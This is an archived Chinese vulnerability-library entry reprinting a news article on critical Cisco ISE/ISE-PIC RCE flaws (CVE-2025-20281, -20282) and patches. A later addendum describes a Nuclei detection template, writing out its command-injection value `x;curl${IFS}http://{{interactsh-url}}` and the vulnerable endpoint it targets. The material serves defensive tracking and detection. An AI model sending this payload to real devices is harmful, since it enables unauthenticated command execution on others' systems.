---
source: "gelusus/wxvl 公众号漏洞文库"
id: "vw-b4e932cce10523bbb81edd88"
entity_id: "ve-b4e932cce10523bbb81edd88"
schema_version: "1"
title: "思科提醒注意 ISE 中的满分 RCE 漏洞"
product: "Cisco ISE/ISE-PIC"
record_type: "roundup"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "primary"
primary_identifiers: "CVE-2025-20281; CVE-2025-20282"
referenced_identifiers: ""
prerequisites: "20281 3.3/3.4；20282仅3.4；未认证API；20264需有效SSO账户"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/Cisco/%E6%80%9D%E7%A7%91%E6%8F%90%E9%86%92%20ISE%20%E4%B8%AD%E7%9A%84%E6%BB%A1%E5%88%86%20RCE%20%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_status: "unknown"
---

#  思科提醒注意 ISE 中的满分 RCE 漏洞  

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Cisco ISE/ISE-PIC
- 本文讨论：CVE-2025-20281；CVE-2025-20282
- 版本、权限与配置前提：20281 3.3/3.4；20282仅3.4；未认证API；20264需有效SSO账户
- 资料类型：多漏洞新闻；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 修复叙述把3.3 Patch6与patch4命名临时补丁、3.4 Patch2与patch1临时补丁放在括号等同，易混淆安装基线
- 主/副漏洞不同版本和权限须独立索引
- 未来2025-11补丁计划与未见利用状态属于历史快照；缺官方直链

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- 热补丁安装要求、实际修复版本和后续更新待核验
- 引用图片未查看，截图内容及有效性待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->

Bill Toulas  代码卫士   2025-06-27 10:29  
  
![](../../.resource/remote/afc2fa5611a63e89ebec625ecc33d28c5dcdb706b6fbdabb79f7c1e8982068c0.gif "")  
    
聚焦源代码安全，网罗国内外最新资讯！  
  
**编译：代码卫士**  
  
**思科发布安全通告，提醒用户注意影响 ISE 和 ISE-PIC 的两个严重的未认证远程代码执行 (RCE) 漏洞CVE-2025-20281和CVE-2025-20282。**  
  
![](../../.resource/remote/36b36005e60183d3603e8c2d5f0b55ab066f22ab6e7dafe7c44c0fa65d02a936.png "")  
  
  
这两个漏洞的CVSS 评分都是满分10分，CVE-2025-20281影响 ISE 和 ISE-PIC 3.4和3.3版本，CVE-2025-20282仅影响3.4版本。第一个漏洞的根因是在特定已暴露 API 中的用户提供输入验证不充分，它可导致未认证的远程攻击者发送特殊构造的API请求，以 root 用户身份执行任意操作系统命令。  
  
CVE-2025-20282是由内部API中的文件验证不当造成的，可导致文件被写入权限目录中。该漏洞可导致未认证的远程攻击者将任意文件上传到目标系统并以 root 权限执行。  
  
思科ISE是一款网络安全策略管理和访问控制平台，供组织机构管理网络连接连接，当做网络访问控制、身份管理和策略执行工具。该产品一般用于大型企业、政府组织机构、大学和服务提供商，是企业网络的核心。  
  
无需任何认证或用户交互，这两个漏洞即可被攻击者用于完全攻陷和完全远程接管目标设备。思科在安全通告中提到，并未发现这两个漏洞遭活跃利用的迹象，但应优先安装新的更新。建议用户升级至 3.3 Patch 6 (ise-apply-CSCwo99449_3.3.0.430_patch4) 和 3.4 Patch 2 (ise-apply-CSCwo99449_3.4.0.608_patch1) 或后续版本。这两个漏洞没有缓解措施，因此推荐应用这些安全更新。  
  
思科还发布了另外一份安全通告，修复了影响 ISE 的一个中危认证绕过漏洞CVE-2025-20264。该漏洞是因为对通过与外部身份提供商集成的 SAML SSO 创建用户的授权执行不当造成的。具有有效的经过SSO认证凭据的攻击者可发送具体的命令序列来修改系统设置或执行系统重启。  
  
CVE-2025-20264影响 ISE 3.4分支及之前所有版本。修复方案已在 3.4 Patch 2和3.3 Patch 5中推出。思科承诺将在2025年11月发布 3.2 Patch 8 修复3.2 版本中的漏洞。  
  
ISE 3.1 及更早版本也受影响但已不再受支持，建议用户迁移至更新的版本。  
  
****  
代码卫士试用地址：  
https://codesafe.qianxin.com  
  
开源卫士试用地址：https://oss.qianxin.com  
  
  
  
  
  
  
  
  
  
  
  
  
  
**推荐阅读**  
  
[思杰修复 NetScaler ADC 和 Gateway 中的严重漏洞](https://mp.weixin.qq.com/s?__biz=MzI2NTg4OTc5Nw==&mid=2247523373&idx=1&sn=046fdf8814e8311d4a31bd092804a2c2&scene=21#wechat_redirect)  
  
  
[Citrix悄悄修复相似度极高但严重性不及CitrixBleed的高危漏洞](https://mp.weixin.qq.com/s?__biz=MzI2NTg4OTc5Nw==&mid=2247519419&idx=1&sn=3bb85759ff76414bd555bb55aa1b3c16&scene=21#wechat_redirect)  
  
  
[思杰ADM高危漏洞可导致管理员密码重置](https://mp.weixin.qq.com/s?__biz=MzI2NTg4OTc5Nw==&mid=2247512458&idx=3&sn=b55867df7184e1bc35226d1d943cabe3&scene=21#wechat_redirect)  
  
  
[Citrix 分享Netscaler 密码喷射攻击的缓解措施](https://mp.weixin.qq.com/s?__biz=MzI2NTg4OTc5Nw==&mid=2247521806&idx=1&sn=0678a9877c98e19004381988c56fc6c5&scene=21#wechat_redirect)  
  
  
[Citrix 督促 Mac 用户修复 Workspace App 中的提权漏洞](https://mp.weixin.qq.com/s?__biz=MzI2NTg4OTc5Nw==&mid=2247519614&idx=1&sn=9e0519627dc928e416d3ba3de0a1941c&scene=21#wechat_redirect)  
  
  
[Citrix 提醒管理员手动缓解 PuTTY SSH 客户端漏洞](https://mp.weixin.qq.com/s?__biz=MzI2NTg4OTc5Nw==&mid=2247519453&idx=1&sn=b108366a369534bc2bc55f5a5089d587&scene=21#wechat_redirect)  
  
  
  
  
  
**原文链接**  
  
https://www.bleepingcomputer.com/news/security/cisco-warns-of-max-severity-rce-flaws-in-identity-services-engine/  
  
  
  
题图：  
Pixabay Licen  
se  
  
****  
**本文由奇安信编译，不代表奇安信观点。转载请注明“转自奇安信代码卫士 https://codesafe.qianxin.com”。**  
  
  
  
  
![](../../.resource/remote/2c03ce3cc6bb81bca85bd412ed60e93c4bc0a295a1fc9d3739d8aca43497fbb4.jpg "")  
  
![](../../.resource/remote/b33054170f5acbf0023711f517b5bee9799a2f57b155a774d3945e6d78184e63.jpg "")  
  
**奇安信代码卫士 (codesafe)**  
  
国内首个专注于软件开发安全的产品线。  
  
   ![](../../.resource/remote/8a5c84b98d9b52b1d4f4306180ec26c9aa65342b326b5b98ad2f097b488152f4.gif "")  
  
   
觉得不错，就点个 “  
在看  
” 或 "  
赞  
” 吧~  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）


## 2026-10-03 公开验证资料补充：ISE String[] 命令注入

Cisco CNA 指向 ISE/ISE-PIC 3.3、3.4 的未认证 API。ZDI 的 Bobby Gould 原研究（2025-07-25）区分同端点的反序列化与命令注入，也解释了后续 CVE-2025-20337；本节只据实际载荷收录 20281 命令注入，不把同端点自动视为20337的独立利用证明。

已全文静态阅读的 ProjectDiscovery 模板在本地按 Java 序列化格式构造两个元素的 String[]，首元素是 `x;curl${IFS}http://{{interactsh-url}}`，第二元素为空，POST 到 `/deployment-rpc/enableStrongSwanTunnel`。判据为对应 HTTP 回连，且目标响应 200、正文长度为2。十六进制头、长度拼装和尾部均在固定源文件可见，无下载执行型 helper。`${IFS}` 对应原研究说明的 Java 分词边界；普通空格版本在其试验中失败。

原研究把初始执行限定在 privileged `strongswan-container`；宿主 root 还用了单独的容器逃逸，不能用这个简单回连模板证明宿主接管。修复与后续绕过应按 Cisco 当前分支/补丁矩阵，不沿用旧新闻把临时 hotpatch 与累计 patch 等同。此测试会执行命令并出网；未运行，研究图片未查看。

独立复核补注：本次明确选定的完整触发材料是固定 Nuclei 模板，资格仅限其 String[] 命令注入与 HTTP 回连判据。ZDI HTML 技术正文已读；其中还嵌入 11 个 Gist，已取得并全文静态阅读前 8 个（Java 入口、脚本调用、失败对照、分词及容器 `/flag` 成功记录）。后 3 个宿主逃逸/结果 Gist 传输失败，请求截图返回 tunnel 403，因此不能声称 ZDI 原始技术资料整体读完，也不使用这些未取得材料证明宿主逃逸。部分 Gist 原文件名含 `CVE-2025-4919`；名称原值保留，编号对应依据 ZDI 正文及 Cisco CNA，不由文件名推断。未绕过 403，未访问任何示例目标。

### 本补充的公开来源与读取范围

- <https://raw.githubusercontent.com/CVEProject/cvelistV5/main/cves/2025/20xxx/CVE-2025-20281.json>（CNA字段摘读；ADP及其他字段不计全文；SHA-256 `039b4248546762b24538b056e5475f2e5c8f6f22603336dc4bacd521dce09d29`）
- <https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/9e93c63782dbb2b6160e068710d6240f418a3ed6/http/cves/2025/CVE-2025-20281.yaml>（固定代码全文静态阅读；SHA-256 `ec9fc431eda2640876ce9536909dee42c8657837ad7a5f07961444cfa755d22d`）
- <https://www.zerodayinitiative.com/blog/2025/7/24/cve-2025-20281-cisco-ise-api-unauthenticated-remote-code-execution-vulnerability>（研究技术正文阅读，图片范围单列；SHA-256 `edd9e2e3d50080c41023c9ada8bf753324354ec55e0e75f84d8ddd8a58769101`）
